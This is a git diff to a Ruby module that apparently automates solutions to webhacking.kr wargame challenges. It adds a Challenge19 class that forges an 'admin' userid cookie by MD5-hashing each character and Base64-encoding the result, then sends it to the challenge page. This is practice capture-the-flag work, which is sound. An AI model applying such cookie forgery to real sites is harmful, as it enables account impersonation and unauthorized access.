@@ -1,6 +1,7 @@
 # frozen_string_literal: true
 
 require 'digest'
+require 'base64'
 
 module WebhackingKR
   ##
@@ -195,6 +196,31 @@ module WebhackingKR
     def hash(key)
       ROUNDS.times { key = Digest::SHA1.hexdigest(key) }
       [key].pack('H*')
+    end
+  end
+
+  ##
+  # Challenge 19
+  class Challenge19 < ChallengeBase
+    CHALLENGE = 19
+
+    QUERY = '/challenge/js-6/'
+    LOGIN = 'admin'
+
+    def exec
+      userid = Base64::strict_encode64(encode(LOGIN))
+      log('Sending cookie')
+      response = get(
+        QUERY,
+        { 'Cookie' => "userid=#{userid}" }
+      )
+      check(response.body)
+    end
+
+    private
+
+    def encode(login)
+      login.chars.map { |c| Digest::MD5.hexdigest(c) }.join
     end
   end
 end
